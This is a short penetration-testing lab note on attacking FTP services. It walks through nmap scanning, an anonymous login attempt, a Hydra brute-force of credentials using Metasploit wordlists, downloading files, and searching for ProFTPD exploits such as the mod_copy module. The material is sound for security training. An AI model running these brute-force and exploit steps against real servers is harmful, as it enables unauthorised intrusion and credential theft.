---
description: '21'
---

# 2 - Exploiting FTP

### **Exploiting FTP**

* FTP (File Transfer Protocol) is a protocol that uses TCP port 21 and is used to facilitate file sharing between a server and client/clients.
* It is also frequently used a a means of transferring files to and from the directory of a web server.
* FTP authenticates requires a username and password combination. As a result, we can perform a brute-force attack on the FTP server in order to identify legitimate credentials.
* In some cases, FTP servers may be configures to allow anonymous access, which consequently allows anyone to the FTP server without providing legitimate credentials.



## **Practical Demonstration**

1 - Identify target ip address by `ifconfig` , target IP is the next ip after your own ip.

2 - `nmap -sV $ip` - nmap scan.&#x20;

3 - `ftp $ip` - we try anonymous login which appears to be disabled.

4 -  `ls -al /usr/share/nmap/scripts/ | grep ftp-*`  - List all the Nmap FTP-related scripts (can be used for other services too).

5 - `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt $ip -t 4 ftp` - Perform a brute force attack against the FTP service with Hydra. Login with the "sysadmin" cred.

6 - `get <fileName>` - Download a file onto the local machine.



`searchsploit ProFTPD` - List all exploits available for the request using the db of ExploitDB.

We can use the "mod copy [https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd\_modcopy\_exec/](https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd\_modcopy\_exec/)



